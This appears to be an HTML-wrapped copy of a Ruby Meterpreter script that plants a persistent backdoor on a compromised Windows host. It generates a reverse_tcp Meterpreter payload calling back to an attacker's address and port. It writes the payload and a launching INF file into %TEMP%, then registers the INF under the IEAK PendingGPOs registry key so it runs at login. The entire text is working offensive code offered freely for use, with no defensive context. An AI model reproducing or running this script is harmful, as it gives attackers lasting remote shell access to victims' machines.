<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Pending GPO And INF</title>
</head><body>#https://github.com/naxonez/scripts/blob/master/persistenceGPO.rb<br/>
#####################################################<br/>
##        Created by @NaxoneZ        ##<br/>
#####################################################<br/>
# Copiar, cambiar, hacer lo que quer√°is.. ITS FREE! #<br/>
#####################################################<br/>
##     Script Persistencia PendingGPOs     ##<br/>
#####################################################<br/>
<br/>
<br/>
#Default parameters for payload<br/>
#-------------------------------------------------------------------------------<br/>
rhost = Rex::Socket.source_address(&quot;1.2.3.4&quot;)<br/>
rport = 4444<br/>
payload_type = &quot;windows/meterpreter/reverse_tcp&quot;<br/>
<br/>
<br/>
#Parameters<br/>
#-------------------------------------------------------------------------------<br/>
@exec_opts = Rex::Parser::Arguments.new(<br/>
 &quot;-h&quot; =&gt; [ false, &quot;This help menu&quot;],<br/>
 &quot;-r&quot; =&gt; [ true,  &quot;The IP of the system running Metasploit listening for the connect back&quot;],<br/>
 &quot;-p&quot; =&gt; [ true,  &quot;The port on which the system running Metasploit is listening&quot;],<br/>
)<br/>
<br/>
<br/>
# Usage Message Function<br/>
#-------------------------------------------------------------------------------<br/>
def usage<br/>
 print_line &quot;Meterpreter Script modified for creating a persistent backdoor on a target host using PendingGPOs.&quot;<br/>
 print_line(@exec_opts.usage)<br/>
 raise Rex::Script::Completed<br/>
end<br/>
<br/>
#Default parameters for files<br/>
#-------------------------------------------------------------------------------<br/>
pathFile = @client.fs.file.expand_path(&quot;%TEMP%&quot;)<br/>
infName = Rex::Text.rand_text_alpha((rand(8)+6)) + &quot;.inf&quot;<br/>
exeName = Rex::Text.rand_text_alpha((rand(8)+6)) + &quot;.exe&quot;<br/>
serviceName = Rex::Text.rand_text_alpha((rand(10)+6))<br/>
infFile = pathFile + &quot;\\&quot; + infName<br/>
exeFile = pathFile + &quot;\\&quot; + exeName<br/>
<br/>
#==============================================================================#<br/>
#==============================================================================#<br/>
<br/>
# Function for Creating the Payload<br/>
#-------------------------------------------------------------------------------<br/>
def create_payload(payload_type,lhost,lport)<br/>
 print_status(&quot;Creating Payload=#{payload_type} LHOST=#{lhost} LPORT=#{lport}&quot;)<br/>
 payload = payload_type<br/>
 pay = client.framework.payloads.create(payload)<br/>
 pay.datastore['LHOST'] = lhost<br/>
 pay.datastore['LPORT'] = lport<br/>
 return pay.generate<br/>
end<br/>
<br/>
<br/>
# Function to install payload in to the registry HKLM or HKCU<br/>
#-------------------------------------------------------------------------------<br/>
def write_to_reg(script_on_target)<br/>
 key_path = &quot;HKCU\\Software\\Microsoft\\IEAK\\GroupPolicy\\PendingGPOs&quot;<br/>
 registry_createkey(key_path)<br/>
 registry_setvaldata(&quot;#{key_path}&quot;, &quot;Path1&quot;, script_on_target, &quot;REG_SZ&quot;)<br/>
 registry_setvaldata(&quot;#{key_path}&quot;, &quot;Section1&quot;, &quot;DefaultInstall&quot;, &quot;REG_SZ&quot;)<br/>
 registry_setvaldata(&quot;#{key_path}&quot;, &quot;Count&quot;, &quot;1&quot;, &quot;REG_DWORD&quot;)<br/>
 print_good(&quot;Installed into autorun as #{key_path}&quot;)<br/>
end<br/>
<br/>
# Function for writing script to target host<br/>
#-------------------------------------------------------------------------------<br/>
def write_script_to_target(file, contentFile)<br/>
 fd = @client.fs.file.new(file, &quot;wb&quot;)<br/>
 fd.write(contentFile)<br/>
 fd.close<br/>
 print_good(&quot;Persistent Script written to #{file}&quot;)<br/>
end<br/>
<br/>
#==============================================================================#<br/>
#==============================================================================#<br/>
<br/>
# Main<br/>
#-------------------------------------------------------------------------------<br/>
@exec_opts.parse(args) { |opt, idx, val|<br/>
case opt<br/>
 when &quot;-h&quot;<br/>
  usage<br/>
 when &quot;-r&quot;<br/>
  rhost = val<br/>
 when &quot;-p&quot;<br/>
  rport = val.to_i<br/>
end<br/>
}<br/>
<br/>
# call for writing executable with payload in system<br/>
#-------------------------------------------------------------------------------<br/>
write_script_to_target(exeFile,::Msf::Util::EXE.to_win32pe(client.framework,create_payload(payload_type, rhost, rport)))<br/>
<br/>
# call for writing inf<br/>
#-------------------------------------------------------------------------------<br/>
write_script_to_target(infFile,&quot;[Version]\r\nsignature = '$CHICAGO$'\r\nAdvancedINF = 2.5,'Persistence for All!'\r\n[DefaultInstall]\r\nRunPreSetupCommands = &quot;+ serviceName +&quot;:2\r\n[&quot;+ serviceName +&quot;]\r\n&quot; + exeFile)<br/>
<br/>
# call for writing registry<br/>
#-------------------------------------------------------------------------------<br/>
write_to_reg(pathFile + &quot;\\&quot; + infName)</body></html>